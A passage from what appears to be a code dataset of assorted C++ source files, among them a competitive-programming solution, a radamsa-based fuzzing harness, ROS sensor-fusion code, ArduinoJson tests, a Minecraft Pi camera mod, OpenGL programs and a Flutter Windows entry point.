right;\n\n\t\tpros::delay(20);\n\t}\n}\n",
    "//PROBLEM Link: https://www.codechef.com/practice/course/strings/STRINGS/problems/HAPPYSTR\n\n#include <bits/stdc++.h>\nusing namespace std;\n\n#pragma GCC optimize(\"O3\", \"unroll-loops\")\nauto init = []() {\n    ios::sync_with_stdio(0);\n    cin.tie(0);\n    cout.tie(0);\n    return 'c';\n}();\n\n// MAIN FUNCTION TO FOCUS ON!\nvoid solve(string &s) {\n    int vowels_count = 0;\n    for(int i = 0; i < s.length(); i++){\n\n        //we check if current substring window has vowel, if yes, we increment the count of vowels.\n        if(s[i] == 'a' || s[i] == 'e' || s[i] == 'i' || s[i] == 'o' || s[i] == 'u'){\n            vowels_count++;\n\n        //else, we check if the count of vowels in the current window was > 2, if yes, we already got a substring respecting the condition.\n\n        }else if(vowels_count > 2){\n            cout << \"Happy\" << endl;\n            return;\n        \n        //else, we reset our window to start from current element and reset the vowel_count to 0\n        }else{\n            vowels_count = 0;\n        }\n    }\n\n    //last check for case when all the chars in the string are vowels. so we reach the end without going to else if or else conditions.\n    if(vowels_count < 2) cout << \"Sad\" << endl;\n    else cout << \"Happy\" << endl;\n    return;\n}\n\nint main() {\n    int t;\n    cin>>t;\n    while(t--){\n        string s;\n        cin>>s;\n    \n        /** IGNORE: code to check time taken to run **/\n        time_t start, end;\n        time(&start); \n        ios_base::sync_with_stdio(false); \n        /** IGNORE: code to check time taken to run **/\n        \n\n\n        // Main Function Call\n        solve(s);\n\n\n\n        /** IGNORE: code to check time taken to run **/\n        time(&end); \n        double time_taken = double(end - start); \n        cout << \"Time taken by program is : \" << fixed \n            << time_taken << setprecision(5); \n        cout << \" sec \" << endl; \n        /** IGNORE: code to check time taken to run **/\n    }\n\n    return 0;\n}",
    "#include <windows.h>\n#include <cstdio>\n#include <tchar.h>\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <iomanip>\n#include <ctime>\n#include <vector>\n#include <string>\n#include <strsafe.h>\n#include <cstdlib>\n#include <filesystem>\n#include \"CLI11.hpp\"\n\n#define RPATH TEXT(\"RADAMSA_PATH\")\n#define BUFSIZE 256\n\nusing namespace std;\nnamespace fs = std::filesystem;\n\nint TIMEOUT = 1000;\nstring originalFolder;\n\nvector<string> listFilesInDirectory(const std::string& directoryPath) {\n    vector<string> fileNames;\n    const fs::path dest = directoryPath;\n    for (const auto& entry : fs::directory_iterator(directoryPath)) {\n        fileNames.push_back(entry.path().filename().string());\n    }\n    return fileNames;\n}\n\nstring removeExtension(const string& filename) {\n    size_t dotPos = filename.rfind('.');\n    if (dotPos == string::npos) {\n        return filename;\n    }\n    return filename.substr(0, dotPos);\n}\n\n\nBOOL mutateInputs(const string& filename, const string& mut, const string& inputFolder, const string& outputFolder, string ext)\n{ \n    string nfilename = removeExtension(filename);\n    string outputFileName = outputFolder + \"\\\\\" + nfilename + \"_id=\" + mut + \".\" + ext;\n    STARTUPINFOA si;\n    PROCESS_INFORMATION pi;\n    DEBUG_EVENT debug_event;\n    string args = \"radamsa.exe \" + inputFolder + \"\\\\\" + filename + \" -m \" + mut + \" -o \" + outputFileName;\n    LPSTR cmd = (LPSTR)args.c_str();\n\n    ZeroMemory(&si, sizeof(si));\n    ZeroMemory(&pi, sizeof(pi));\n    si.cb = sizeof(si);\n\n    if (!CreateProcessA(\n        nullptr,           // Target app\n        cmd,                 // Command line\n        nullptr,           // Process handle not inheritable\n        nullptr,            // Thread handle not inheritable\n        FALSE,                // Set handle inheritance to FALSE\n        0,                   // No creation flag\n        nullptr,               // Use parent's environment block\n        nullptr,            // Use parent's starting directory\n        &si,                    // Pointer to STARTUPINFO structure\n        &pi)              // Pointer to PROCESS_INFORMATION structure\n        )\n    {\n        printf(\"CreateProcess failed GLE=(%lu).\\n\", GetLastError());\n        return 1;\n    }\n\n    // Wait until child process exits.\n    WaitForSingleObject(pi.hProcess, INFINITE);\n\n    // Close process and thread handles\n    TerminateProcess(pi.hProcess, 0);\n    CloseHandle(pi.hProcess);\n    CloseHandle(pi.hThread);\n\n    return TRUE;\n}\n\nvoid reportCrash(const string& exceptionMessage, DWORD exceptionCode, const string& inputFile)\n{\n    string crashFolder = originalFolder + \"crashes\";\n    if (!fs::exists(crashFolder)) \n    {\n        fs::create_directory(crashFolder);\n    }\n    string filename = crashFolder + \"\\\\\" + \"crashes_log\" + \".txt\";\n    ofstream outfile(filename, ios::app); \n    outfile << exceptionMessage << hex << exceptionCode << \"with file: \" << inputFile << endl;\n    outfile.close();\n\n    fs::path source = inputFile;\n    fs::path dest = crashFolder + inputFile;\n    fs::copy(source, dest);\n\n}\n\nDWORD ProcessDebugEvent(DEBUG_EVENT* debugEvent, const string& inputFile)\n{\n    if (debugEvent->dwDebugEventCode == EXCEPTION_DEBUG_EVENT)\n    {\n\n        EXCEPTION_RECORD* exceptionRecord = &debugEvent->u.Exception.ExceptionRecord;\n        DWORD exceptionCode = exceptionRecord->ExceptionCode;\n\n        switch (exceptionCode)\n        {\n        case EXCEPTION_BREAKPOINT:\n            break;\n        case EXCEPTION_ACCESS_VIOLATION:\n            reportCrash(\"Critical exception: Access Violation (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_ARRAY_BOUNDS_EXCEEDED:\n            reportCrash(\"Critical exception: Array Bounds Exceeded (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_DENORMAL_OPERAND:\n            reportCrash(\"Critical exception: Invalid floating-point operation (denormal operand) (0x\", exceptionCode,\n                        inputFile);\n            break;\n\n        case EXCEPTION_FLT_DIVIDE_BY_ZERO:\n            reportCrash(\"Critical exception: Floating-point division by zero (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_OVERFLOW:\n            reportCrash(\"Critical exception: Floating-point overflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_STACK_CHECK:\n            reportCrash(\"Critical exception: Hardware floating-point stack overflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_UNDERFLOW:\n            reportCrash(\"Critical exception: Floating-point underflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_ILLEGAL_INSTRUCTION:\n            reportCrash(\"Critical exception: Illegal instruction encountered (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_IN_PAGE_ERROR:\n            reportCrash(\"Critical exception: Page fault (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEP",
    "#include <ros/ros.h>\n#include <fstream>\n#include \"../include/SplineState.h\"\n#include \"../include/utils/PoseVisualization.h\"\n#include \"sensor_msgs/Imu.h\"\n#include \"geometry_msgs/TransformStamped.h\"\n#include \"geometry_msgs/PoseWithCovarianceStamped.h\"\n#include \"nav_msgs/Path.h\"\n#include \"cf_msgs/Tdoa.h\"\n#include \"isas_msgs/RTLSRange.h\"\n#include \"isas_msgs/RTLSStick.h\"\n#include \"isas_msgs/AnchorPosition.h\"\n#include \"isas_msgs/Anchorlist.h\"\n#include \"sensor_msgs/PointCloud.h\"\n#include \"sfuise_msgs/Spline.h\"\n#include \"sfuise_msgs/Estimate.h\"\n#include \"sfuise_msgs/Calib.h\"\n#include \"std_msgs/Int64.h\"\n\nclass EstimationInterface\n{\n\n  public:\n\n    EstimationInterface(ros::NodeHandle& nh)\n    {\n        initialized_anchor = false;\n        if_nav_uwb = false;\n        readParamsInterface(nh);\n        sub_start = nh.subscribe(\"/SplineFusion/start_time\",1000, &EstimationInterface::startCallBack, this);\n        std::string imu_type = CommonUtils::readParam<std::string>(nh, \"topic_imu\");\n        sub_imu = nh.subscribe(imu_type, 400, &EstimationInterface::getImuCallback, this);\n        pub_imu = nh.advertise<sensor_msgs::Imu>(\"imu_ds\",400);\n        std::string uwb_type = CommonUtils::readParam<std::string>(nh, \"topic_uwb\");\n        if (!uwb_type.compare(\"/tdoa_data\")) {\n            sub_uwb = nh.subscribe(uwb_type, 400, &EstimationInterface::getTdoaUTILCallback, this);\n            pub_uwb = nh.advertise<cf_msgs::Tdoa>(\"tdoa_ds\",400);\n        } else if (!uwb_type.compare(\"/rtls_flares\")) {\n            sub_uwb = nh.subscribe(uwb_type, 400, &EstimationInterface::getToaISASCallback, this);\n            pub_uwb = nh.advertise<isas_msgs::RTLSStick>(\"toa_ds\",400);\n        } else {\n            ROS_ERROR_STREAM(\"Wrong UWB format!\");\n        }\n        std::string anchor_type = CommonUtils::readParam<std::string>(nh, \"topic_anchor_list\");\n        if (!if_tdoa) {\n            if (!anchor_type.compare(\"/anchor_list\")) {\n                sub_anchor = nh.subscribe(anchor_type, 400, &EstimationInterface::getAnchorListFromISASCallback, this);\n            } else {\n                ROS_ERROR_STREAM(\"Anchor list not available!\");\n            }\n        }\n        anchor_pos_pub = nh.advertise<sensor_msgs::PointCloud>(\"visualization_anchor\", 1000);\n        anchor_pub = nh.advertise<isas_msgs::Anchorlist>(\"anchor_list\", 1000);\n        timer_anchor = nh.createTimer(ros::Duration(1/100), std::bind(&EstimationInterface::publishAnchor, this));\n        std::string gt_type = CommonUtils::readParam<std::string>(nh, \"topic_ground_truth\");\n        if (!gt_type.compare(\"/vive/transform/tracker_1_ref\")) {\n            sub_gt = nh.subscribe(gt_type, 1000, &EstimationInterface::getGtFromISASCallback, this);\n        } else if (!gt_type.compare(\"/pose_data\")) {\n            sub_gt = nh.subscribe(gt_type, 1000, &EstimationInterface::getGtFromUTILCallback, this);\n        }\n        int control_point_fps = CommonUtils::readParam<int>(nh, \"control_point_fps\");\n        dt_ns = 1e9 / control_point_fps;\n        sub_calib = nh.subscribe(\"/SplineFusion/sys_calib\", 100, &EstimationInterface::getCalibCallback, this);\n        sub_est = nh.subscribe(\"/SplineFusion/est_window\", 100, &EstimationInterface::getEstCallback, this);\n        pub_opt_old = nh.advertise<nav_msgs::Path>(\"bspline_optimization_old\", 1000);\n        pub_opt_window = nh.advertise<nav_msgs::Path>(\"bspline_optimization_window\", 1000);\n        opt_old_path.header.frame_id = \"map\";\n        pub_opt_pose = nh.advertise<visualization_msgs::Marker>(\"opt_pose\", 1000);\n        opt_pose_vis.setColor(85.0/255.0,164.0/255.0,104.0/255.0);\n    }\n\nprivate:\n\n    int64_t dt_ns;\n    bool initialized_anchor;\n    bool if_tdoa;\n    bool if_nav_uwb;\n    CalibParam calib_param;\n    Eigen::aligned_vector<PoseData> gt;\n    Eigen::aligned_map<uint16_t, Eigen::Vector3d> anchor_list;\n    double imu_sample_coeff;\n    double uwb_sample_coeff;\n    double imu_frequency;\n    double uwb_frequency;\n    double average_runtime;\n    bool gyro_unit;\n    bool acc_ratio;\n    SplineState spline_global;\n    Eigen::aligned_vector<PoseData> opt_old;\n    Eigen::aligned_vector<PoseData> opt_window;\n    ros::Timer timer_anchor;\n    ros::Subscriber sub_imu;\n    ros::Subscriber sub_uwb;\n    ros::Subscriber sub_anchor;\n    ros::Subscriber sub_gt;\n    ros::Subscriber sub_calib;\n    ros::Subscriber sub_est;\n    ros::Subscriber sub_start;\n    ros::Publisher pub_imu;\n    ros::Publisher pub_uwb;\n    ros::Publisher anchor_pos_pub;\n    ros::Publisher anchor_pub;\n    ros::Publisher pub_opt_old;\n    ros::Publisher pub_opt_window;\n    ros::Publisher pub_opt_pose;\n    nav_msgs::Path opt_old_path;\n    PoseVisualization opt_pose_vis;\n\n    void readParamsInterface(ros::NodeHandle& nh)\n    {\n        if_tdoa = CommonUtils::readParam<bool>(nh, \"if_tdoa\");\n        imu_sample_coeff = CommonUtils::readParam<double>(nh, \"imu_sample_coeff\");\n        uwb_sample_coeff = CommonUtils::readParam<double>(nh, \"uwb_sample_coeff\");\n        imu_frequency = CommonUtils::readParam<double>(nh, \"imu_fr",
    "// ArduinoJson - https://arduinojson.org\n// Copyright \u00a9 2014-2022, Benoit BLANCHON\n// MIT License\n\n#include <ArduinoJson.h>\n#include <catch.hpp>\n\nstatic void check(JsonArray array, std::string expected) {\n  std::string actual;\n  size_t actualLen = serializeJson(array, actual);\n  REQUIRE(expected == actual);\n  REQUIRE(actualLen == expected.size());\n  size_t measuredLen = measureJson(array);\n  REQUIRE(measuredLen == expected.size());\n}\n\nTEST_CASE(\"serializeJson(JsonArray)\") {\n  StaticJsonDocument<JSON_ARRAY_SIZE(2)> doc;\n  JsonArray array = doc.to<JsonArray>();\n\n  SECTION(\"Empty\") {\n    check(array, \"[]\");\n  }\n\n  SECTION(\"Null\") {\n    array.add(static_cast<char *>(0));\n\n    check(array, \"[null]\");\n  }\n\n  SECTION(\"OneString\") {\n    array.add(\"hello\");\n\n    check(array, \"[\\\"hello\\\"]\");\n  }\n\n  SECTION(\"TwoStrings\") {\n    array.add(\"hello\");\n    array.add(\"world\");\n\n    check(array, \"[\\\"hello\\\",\\\"world\\\"]\");\n  }\n\n  SECTION(\"OneStringOverCapacity\") {\n    array.add(\"hello\");\n    array.add(\"world\");\n    array.add(\"lost\");\n\n    check(array, \"[\\\"hello\\\",\\\"world\\\"]\");\n  }\n\n  SECTION(\"One double\") {\n    array.add(3.1415927);\n    check(array, \"[3.1415927]\");\n  }\n\n  SECTION(\"OneInteger\") {\n    array.add(1);\n\n    check(array, \"[1]\");\n  }\n\n  SECTION(\"TwoIntegers\") {\n    array.add(1);\n    array.add(2);\n\n    check(array, \"[1,2]\");\n  }\n\n  SECTION(\"serialized(const char*)\") {\n    array.add(serialized(\"{\\\"key\\\":\\\"value\\\"}\"));\n\n    check(array, \"[{\\\"key\\\":\\\"value\\\"}]\");\n  }\n\n  SECTION(\"serialized(char*)\") {\n    char tmp[] = \"{\\\"key\\\":\\\"value\\\"}\";\n    array.add(serialized(tmp));\n\n    check(array, \"[{\\\"key\\\":\\\"value\\\"}]\");\n  }\n\n  SECTION(\"OneIntegerOverCapacity\") {\n    array.add(1);\n    array.add(2);\n    array.add(3);\n\n    check(array, \"[1,2]\");\n  }\n\n  SECTION(\"OneTrue\") {\n    array.add(true);\n\n    check(array, \"[true]\");\n  }\n\n  SECTION(\"OneFalse\") {\n    array.add(false);\n\n    check(array, \"[false]\");\n  }\n\n  SECTION(\"TwoBooleans\") {\n    array.add(false);\n    array.add(true);\n\n    check(array, \"[false,true]\");\n  }\n\n  SECTION(\"OneBooleanOverCapacity\") {\n    array.add(false);\n    array.add(true);\n    array.add(false);\n\n    check(array, \"[false,true]\");\n  }\n\n  SECTION(\"OneEmptyNestedArray\") {\n    array.createNestedArray();\n\n    check(array, \"[[]]\");\n  }\n\n  SECTION(\"OneEmptyNestedHash\") {\n    array.createNestedObject();\n\n    check(array, \"[{}]\");\n  }\n}\n",
    "#include <symbols/minecraft.h>\n#include <libreborn/libreborn.h>\n\n#include \"init.h\"\n#include \"api.h\"\n\n// Camera control\nfloat pitch = 0, yaw = 0;\nstatic bool TripodCamera_hurt_injection(Mob *self, Entity *attacker, UNUSED int damage) {\n    if (attacker != (Entity *) mc->player) return false;\n    if (mc->player->input->is_sneaking) {\n        // Remove\n        self->vtable->remove(self);\n        return false;\n    }\n    mc->camera = self;\n    pitch = mc->player->pitch;\n    yaw = mc->player->yaw;\n    return false;\n}\nMob_tick_t TripodCamera_tick_original = NULL;\nstatic void TripodCamera_tick_injection(Mob *self) {\n    if (self == mc->camera && mc->player) {\n        self->pitch += mc->player->pitch - pitch;\n        self->yaw += mc->player->yaw - yaw;\n        mc->player->pitch = pitch;\n        mc->player->yaw = yaw;\n        // Adjust rot\n        if (self->pitch >= 90) self->pitch = 89;\n        else if (self->pitch <= -90) self->pitch = -89;\n        if (self->yaw > 360) self->yaw -= 360;\n        else if (self->yaw < -360) self->yaw += 360;\n        // Check for exits\n        if (mc->player->input->is_sneaking) {\n            // Release the camera\n            mc->camera = (Mob *) mc->player;\n        }\n    }\n    // Call orignal\n    TripodCamera_tick_original(self);\n    // Check if removed\n    if (self == mc->camera && self->pending_removal) {\n        mc->camera = (Mob *) mc->player;\n    }\n}\n\n// Camera legs texture fix\nOVERWRITE_CALL(0x659dc, void, EntityRenderer_bindTexture_injection, (EntityRenderer *self, UNUSED std::string *file)) {\n    std::string camera = \"item/camera.png\";\n    EntityRenderer_bindTexture(self, &camera);\n}\nOVERWRITE_CALL(0x65a08, void, render_camera_legs, ()) {\n    Tesselator *t = &Tesselator_instance;\n    Tesselator_vertexUV(t, -.45, 0.5, -.45, 0.75, 0.5);\n    Tesselator_vertexUV(t, -.45, -.5, -.45, 0.75, 1  );\n    Tesselator_vertexUV(t, 0.45, -.5, 0.45, 1,    1  );\n    Tesselator_vertexUV(t, 0.45, 0.5, 0.45, 1,    0.5);\n\n    Tesselator_vertexUV(t, 0.45, 0.5, 0.45, 0.75, 0.5);\n    Tesselator_vertexUV(t, 0.45, -.5, 0.45, 0.75, 1  );\n    Tesselator_vertexUV(t, -.45, -.5, -.45, 1,    1  );\n    Tesselator_vertexUV(t, -.45, 0.5, -.45, 1,    0.5);\n\n    Tesselator_vertexUV(t, -.45, 0.5, 0.45, 0.75, 0.5);\n    Tesselator_vertexUV(t, -.45, -.5, 0.45, 0.75, 1  );\n    Tesselator_vertexUV(t, 0.45, -.5, -.45, 1,    1  );\n    Tesselator_vertexUV(t, 0.45, 0.5, -.45, 1,    0.5);\n\n    Tesselator_vertexUV(t, 0.45, 0.5, -.45, 0.75, 0.5);\n    Tesselator_vertexUV(t, 0.45, -.5, -.45, 0.75, 1  );\n    Tesselator_vertexUV(t, -.45, -.5, 0.45, 1,    1  );\n    Tesselator_vertexUV(t, -.45, 0.5, 0.45, 1,    0.5);\n}\n\n__attribute__((constructor)) static void init() {\n    // TODO: Fix astral projection bug\n    // Camera preview\n    patch_address((void *) 0x10c914, (void *) TripodCamera_hurt_injection);\n    TripodCamera_tick_original = *(Mob_tick_t *) 0x10c8a4;\n    patch_address((void *) 0x10c8a4, (void *) TripodCamera_tick_injection);\n}\n",
    "#include <GL/glut.h> // For OpenGL rendering\n#include <iostream> // For standard I/O operations\n#include <memory> // For smart pointers\n#include <cstring> // For string operations\n#include <random> // For generating random file names\n#include <dirent.h> // For directory operations\n#include <cstdio>   // For file I/O\n#include <unistd.h> // For getopt and optarg\n#include \"stb/stb_image_write.h\" // For STB image write operations\n#include \"tinygltf/tiny_gltf.h\" // For loading GLB files\n#include <sys/stat.h> // For checking file existence\n#include <cmath> // For mathematical operations\n#include <GL/glu.h> // For GLU functions\n\n#ifdef _WIN32\n#include <Windows.h> // For Windows specific operations\n#endif\n\nstruct RenderParams {\n    std::string glb_file_path;\n    std::string output_file_name;\n    std::string output_folder_path;\n    std::string file_type; // Options: png, jpg, jpeg\n    std::string render_mode; // Default: gpu. Options: cpu, gpu\n};\n\nstd::string to_lowercase(const std::string &str) {\n    std::string result;\n    for (char c: str) {\n        result += std::tolower(c);\n    }\n    return result;\n}\n\nstd::string generate_unique_output_file_name(const std::string &output_folder_path) {\n    std::random_device rd;\n    std::mt19937 gen(rd());\n    std::uniform_int_distribution<> dis(0, 35);\n\n    std::string output_file_name;\n\n    while (true) {\n        output_file_name.clear(); // Clear the string for generating a new name\n        for (int i = 0; i < 32; ++i) {\n            output_file_name.push_back(\"abcdefghijklmnopqrstuvwxyz0123456789\"[dis(gen)]);\n        }\n\n        // Check for existence of file with the same name, if found, generate a new name\n        DIR *dir;\n        struct dirent *ent;\n        bool found = false;\n        if ((dir = opendir(output_folder_path.c_str())) != nullptr) {\n            while ((ent = readdir(dir)) != nullptr) {\n                if (ent->d_type == DT_REG && std::strcmp(ent->d_name, output_file_name.c_str()) == 0) {\n                    found = true;\n                    break;\n                }\n            }\n            closedir(dir);\n        } else {\n            std::cerr << \"\\nError opening output directory.\\n\";\n            exit(EXIT_FAILURE);\n        }\n\n        if (!found) {\n            break;\n        }\n    }\n\n    return output_file_name;\n}\n\n// Calculate the bounding box of the scene\nvoid calculate_bounding_box(const tinygltf::Model &model, float &minX, float &minY, float &minZ, float &maxX, float &maxY,\n                          float &maxZ) {\n    minX = minY = minZ = std::numeric_limits<float>::max();\n    maxX = maxY = maxZ = std::numeric_limits<float>::min();\n\n    for (const auto &mesh: model.meshes) {\n        for (const auto &primitive: mesh.primitives) {\n            const tinygltf::Accessor &accessor = model.accessors[primitive.attributes.at(\"POSITION\")];\n            const tinygltf::BufferView &bufferView = model.bufferViews[accessor.bufferView];\n            const tinygltf::Buffer &buffer = model.buffers[bufferView.buffer];\n            const float *positions = reinterpret_cast<const float *>(&buffer.data[accessor.byteOffset + bufferView.byteOffset]);\n\n            for (size_t i = 0; i < accessor.count; ++i) {\n                float x = positions[i * 3];\n                float y = positions[i * 3 + 1];\n                float z = positions[i * 3 + 2];\n\n                minX = std::min(minX, x);\n                minY = std::min(minY, y);\n                minZ = std::min(minZ, z);\n                maxX = std::max(maxX, x);\n                maxY = std::max(maxY, y);\n                maxZ = std::max(maxZ, z);\n            }\n        }\n    }\n}\n\n// Set up the camera based on the bounding box\nvoid set_up_camera(float minX, float minY, float minZ, float maxX, float maxY, float maxZ) {\n    // Calculate center of the bounding box\n    float centerX = (minX + maxX) / 2.0f;\n    float centerY = (minY + maxY) / 2.0f;\n    float centerZ = (minZ + maxZ) / 2.0f;\n\n    // Calculate distance from the camera to the bounding box corners\n    float distanceX = std::abs(maxX - minX) / 2.0f;\n    float distanceY = std::abs(maxY - minY) / 2.0f;\n    float distanceZ = std::abs(maxZ - minZ) / 2.0f;\n    float distance = std::sqrt(distanceX * distanceX + distanceY * distanceY + distanceZ * distanceZ);\n\n    // Set up the camera\n    glMatrixMode(GL_MODELVIEW);\n    glLoadIdentity();\n    gluLookAt(centerX, centerY, centerZ + distance, // Eye position\n              centerX, centerY, centerZ, // Look-at position\n              0.0f, 1.0f, 0.0f); // Up direction\n}\n\n// Initialize OpenGL context and perform rendering via GPU\nvoid render_glb_with_opengl_gpu(const char *glb_file_path, const char *output_folder_path, const char *output_file_name,\n                                const char *file_type) {\n    int argc = 1;\n    char *argv[] = {strdup(\"RenderGLB+\"), nullptr}; // strdup() duplicates the string\n\n    glutInit(&argc, argv);\n    glutInitDisplayMode(GLUT_RGB | GLUT_DOUBLE | GLUT_DEPTH);\n    glutInitWindowSize(800, 600);\n    glutCreateW",
    "/***************************************************/\n/* Part of GDSiON software synthesizer             */\n/* Copyright (c) 2024 Yuri Sizov and contributors  */\n/* Provided under MIT                              */\n/***************************************************/\n\n#include \"sion_event.h\"\n\n#include \"sion_data.h\"\n#include \"sion_driver.h\"\n\nconst char *SiONEvent::QUEUE_EXECUTING = \"queue_executing\";\nconst char *SiONEvent::QUEUE_COMPLETED = \"queue_completed\";\nconst char *SiONEvent::QUEUE_CANCELLED = \"queue_cancelled\";\n\nconst char *SiONEvent::STREAMING = \"streaming\";\nconst char *SiONEvent::STREAM_STARTED = \"stream_started\";\nconst char *SiONEvent::STREAM_STOPPED = \"stream_stopped\";\nconst char *SiONEvent::SEQUENCE_FINISHED = \"sequence_finished\";\n\nconst char *SiONEvent::FADING = \"fading\";\nconst char *SiONEvent::FADE_IN_COMPLETED = \"fade_in_completed\";\nconst char *SiONEvent::FADE_OUT_COMPLETED = \"fade_out_completed\";\n\nSiONData *SiONEvent::get_data() const {\n\tERR_FAIL_NULL_V(_driver, nullptr);\n\treturn _driver->get_data();\n}\n\n//\n\nvoid SiONEvent::_bind_methods() {\n\tClassDB::bind_method(D_METHOD(\"get_driver\"), &SiONEvent::get_driver);\n\tClassDB::bind_method(D_METHOD(\"get_data\"), &SiONEvent::get_data);\n\tClassDB::bind_method(D_METHOD(\"get_stream_buffer\"), &SiONEvent::get_stream_buffer);\n}\n\nSiONEvent::SiONEvent(String p_type, SiONDriver *p_driver, PackedVector2Array p_stream_buffer) {\n\t_event_type = p_type;\n\t_driver = p_driver;\n\t_stream_buffer = p_stream_buffer;\n}\n",
    "/*\r\n * OpenGL.cpp\r\n *\r\n *  Created on: Abril 04, 2024\r\n *      Author: guiil_000\r\n */\r\n\r\n#include <GL/glut.h>\r\n#include <iostream>\r\n\r\nvoid Desenha(void) {\r\n\tglClear(GL_COLOR_BUFFER_BIT);\r\n\r\n\tgluOrtho2D(-5, 6, -4, 8);\r\n\r\n\tglBegin(GL_QUADS);\r\n\tfor (int i = -2; i <= 3; i++) {\r\n\t\tglColor3f(1, i, 0);\r\n\t\tglVertex2f(i, 2);\r\n\t\tglVertex2f(i, 4);\r\n\t}\r\n\tglEnd();\r\n\r\n\tglBegin(GL_LINES);\r\n\tglColor3f(0.6, 0.2, 0.8);\r\n\tglVertex2f(-4, 4);\r\n\tglVertex2f(5, 4);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_QUADS);\r\n\tglColor3f(0.59, 0.29, 0);\r\n\tglVertex2f(-4, 4.5);\r\n\tglVertex2f(-4, -4);\r\n\tglVertex2f(-3.5, -4);\r\n\tglVertex2f(-3.5, 4.5);\r\n\r\n\tglVertex2f(5, 4.5);\r\n\tglVertex2f(5, -4);\r\n\tglVertex2f(4.5, -4);\r\n\tglVertex2f(4.5, 4.5);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_QUADS);\r\n\tglColor3f(0.72, 0.45, 0.2);\r\n\tglVertex2f(-1, -4);\r\n\tglVertex2f(0, -3);\r\n\tglVertex2f(1, -3);\r\n\tglVertex2f(2, -4);\r\n\tglEnd();\r\n\r\n\tglPointSize(7.0);\r\n\tglBegin(GL_POINTS);\r\n\tglColor3f(0.5, 0.5, 0.5);\r\n\tglVertex2f(0, 0);\r\n\tglVertex2f(0.5, -1);\r\n\tglVertex2f(0, -1);\r\n\tglVertex2f(0, -2);\r\n\tglVertex2f(-0.5, -2);\r\n\tglVertex2f(-0.5, -3);\r\n\tglVertex2f(1.5, -3);\r\n\tglVertex2f(1.5, -2);\r\n\tglVertex2f(1.5, -1);\r\n\tglVertex2f(1, -2);\r\n\tglVertex2f(0.5, -2);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_LINES);\r\n\tglColor3f(0.53, 0.81, 0.98);\r\n\tglVertex2f(0, 5);\r\n\tglVertex2f(0.3, 6);\r\n\r\n\tglVertex2f(1, 2);\r\n\tglVertex2f(1.3, 3);\r\n\r\n\tglVertex2f(2, 1);\r\n\tglVertex2f(2.3, 2);\r\n\r\n\tglVertex2f(-1, -1);\r\n\tglVertex2f(-1.3, -2);\r\n\r\n\tglVertex2f(-2, -3);\r\n\tglVertex2f(-2.3, -4);\r\n\r\n\tglVertex2f(-4, 0);\r\n\tglVertex2f(-4.3, -1);\r\n\r\n\tglVertex2f(1, -1);\r\n\tglVertex2f(1.3, 0);\r\n\r\n\tglVertex2f(2, -3);\r\n\tglVertex2f(2.3, -2);\r\n\r\n\tglVertex2f(4, -4);\r\n\tglVertex2f(4.3, -3);\r\n\r\n\tglVertex2f(5, -2);\r\n\tglVertex2f(5.3, -1);\r\n\r\n\tglVertex2f(4, 3);\r\n\tglVertex2f(4.3, 4);\r\n\r\n\tglVertex2f(3, 2);\r\n\tglVertex2f(3.3, 3);\r\n\r\n\tglVertex2f(-3, 3);\r\n\tglVertex2f(-3.3, 2);\r\n\r\n\tglVertex2f(-4, 5);\r\n\tglVertex2f(-4.3, 4);\r\n\r\n\tglVertex2f(-2, 1);\r\n\tglVertex2f(-2.3, 0);\r\n\r\n\tglVertex2f(0, 1);\r\n\tglVertex2f(0.3, 2);\r\n\r\n\tglVertex2f(-0.3, 3);\r\n\tglVertex2f(-.6, 2);\r\n\r\n\tglVertex2f(-2, 5);\r\n\tglVertex2f(-2.3, 4);\r\n\r\n\tglVertex2f(-3, 6);\r\n\tglVertex2f(-3.3, 5);\r\n\r\n\r\n\tglVertex2f(3, 5);\r\n\tglVertex2f(3.3, 6);\r\n\r\n\r\n\tglVertex2f(2, 6);\r\n\tglVertex2f(2.3, 7);\r\n\r\n\r\n\tglVertex2f(-1, 7);\r\n\tglVertex2f(-1.3, 6);\r\n\r\n\r\n\tglVertex2f(4, 6);\r\n\tglVertex2f(4.3, 7);\r\n\r\n\tglVertex2f(3, -2);\r\n\tglVertex2f(3.3, -1);\r\n\r\n\tglEnd();\r\n\r\n\tglFlush();\r\n}\r\n\r\nint main(int argc, char** argv) {\r\n\tglutInit(&argc, argv);\r\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\r\n\tglutInitWindowSize(1000, 500);\r\n\tglutInitWindowPosition(120, 150);\r\n\tglutCreateWindow(\"Sad Junina\");\r\n\tglutDisplayFunc(Desenha);\r\n\tglutMainLoop();\r\n}\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_keyboard_custom\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
